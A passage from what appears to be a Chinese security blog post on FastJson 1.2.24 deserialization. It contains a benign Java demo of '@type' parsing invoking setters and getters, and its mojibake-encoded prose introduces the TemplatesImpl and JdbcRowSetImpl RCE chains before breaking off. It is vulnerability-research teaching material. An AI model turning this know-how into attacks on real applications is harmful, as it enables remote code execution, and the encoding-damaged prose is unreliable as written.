<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.alibaba.fastjson.JSON;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.UnsupportedEncodingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Arrays;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Properties;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName FastJsonTest
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/11 19:34
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> FastJsonTest {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String t1;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Integer t2;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Boolean t3;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t4;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t5;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">byte</span>[] t6;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String toString() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;FastJsonTest{&#34;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;t1=&#39;&#34;</span> + t1 + <span style="color:#0ff;font-weight:bold">&#39;\&#39;&#39;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t2=&#34;</span> + t2 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t3=&#34;</span> + t3 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t4=&#34;</span> + t4 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t5=&#34;</span> + t5 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t6=&#34;</span> + Arrays.<span style="color:#007f7f">toString</span>(t6) +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#39;}&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">byte</span>[] getT6() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT6(<span style="color:#fff;font-weight:bold">byte</span>[] t6) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t6</span> = t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> FastJsonTest() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;FastJsonTest() is called &#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT5(Properties t5) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t5</span> = t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT1(String t1) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t1</span> = t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT2(Integer t2) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t2</span> = t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getT1() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Integer getT2() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Boolean getT3() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT3()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT4() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT4()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t4;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT5() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> UnsupportedEncodingException {
</span></span><span style="display:flex;"><span>        String jsonString = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.reus09.FastJsonTest\&#34;,\&#34;t1\&#34;:\&#34;t1\&#34;,\&#34;t2\&#34;:1,\&#34;t3\&#34;:1,\&#34;t4\&#34;:{},\&#34;t5\&#34;:{},\&#34;t6\&#34;:\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,FastJson&#34;</span>.<span style="color:#007f7f">getBytes</span>(<span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>))+<span style="color:#0ff;font-weight:bold">&#34;\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parse(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj = JSON.<span style="color:#007f7f">parse</span>(jsonString);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string,clazz)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj1 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString,FastJsonTest.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj1);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj2 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144421136.png" alt="image-20221012144421136"  />
</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221012144724722.png" alt="image-20221012144724722"  />
</p>
<p>æ€»çš„æ¥è¯´ï¼Œ<code>parse(string)</code>,<code>parseObject(string,clazzs)</code>ä¸<code>parseObject(string)</code>è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œ<code>parse(string) </code>ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ <code>setter</code> æ–¹æ³•ï¼Œè€Œ <code>parseObject(string)</code> ç”±äºè¦å°†è¿”å›å€¼è½¬åŒ–ä¸º<code>JSONObject</code>ï¼Œå¤šæ‰§è¡Œäº†<code> JSON.toJSON(obj)</code>ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„<code>getter </code>æ–¹æ³•æ¥å°†å‚æ•°èµ‹å€¼ç»™<code>JSONObject</code>ï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<code>parseObject(string)</code>çš„å±å®³æ€§ç›¸å¯¹ä¼šæ›´å¤§ã€‚</p>
<h2 id="fastjson-1224åˆ†æ"><code>FastJson 1.2.24</code>åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#fastjson-1224åˆ†æ">#</a></h2>
<p><code>FastJson1.2.24</code>å¼€å¯äº†FastJsonååºåˆ—å®ç°RCEçš„å¤§é—¨</p>
<p>fastjson é»˜è®¤ä½¿ç”¨ <code>@type</code> æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚</p>
<p>è¿™é‡Œå¯¹<code>1.2.24</code>çš„ä¸¤æ¡å¸¸è§åˆ©ç”¨é“¾<code>TemplatesImpl ååºåˆ—åŒ–</code>å’Œ<code>JdbcRowSetImpl ååºåˆ—åŒ–</code>è¿›è¡Œç®€å•çš„å­¦ä¹ ã€‚</p>
<h3 id="templatesimpl-ååºåˆ—åŒ–"><code>TemplatesImpl</code> ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#templatesimpl-ååºåˆ—åŒ–">#</a></h3>
<p>åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾çš„å…¨è¿‡ç¨‹ï¼Œå®é™…ä¸Šåœ¨æŸ¥é˜…èµ„æ–™çš„åŒæ—¶ï¼Œå‘ç°å…¶ä¹Ÿæ˜¯<code>CommonsCollections-3</code>é“¾å­çš„åˆ†æï¼Œå› ä¸ºåˆšåˆšæ¥è§¦åˆ°<code>Javaå®‰å…¨</code>,å¯¹<code>CC3é“¾åªæ˜¯</code>ç•¥æœ‰è€³é—»ï¼Œä¹‹åçš„å­¦ä¹ ä¹‹ä¸­ä¼šæ…¢æ…¢å­¦ä¹ <code>CC</code>é“¾çš„å„ç§åˆ©ç”¨å§¿åŠ¿ã€‚</p>
<p>å‚è€ƒçš„å„ä½å¤§å¸ˆå‚…çš„åšå®¢å…³äº<code>TemplateImpl</code>ååºåˆ—åŒ–é“¾çš„æ€è€ƒéƒ½æ˜¯ä»æ¼æ´æŒ–æ˜çš„æ€è·¯å¼€å§‹ï¼Œä»<code>getTransletInstance()</code>è¿™ä¸ªå®ä¾‹åŒ–ç‚¹å‡ºå‘ï¼Œéœ€è¦å“ªä¸€ä¸ªåˆ©ç”¨å…ƒç´ å°±å»å¯»æ‰¾ï¼Œæœ€åå®Œå–„åˆ©ç”¨è¿‡ç¨‹ã€‚</p>
<p>å‡½æ•°æ ˆè°ƒç”¨æƒ…å†µ:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
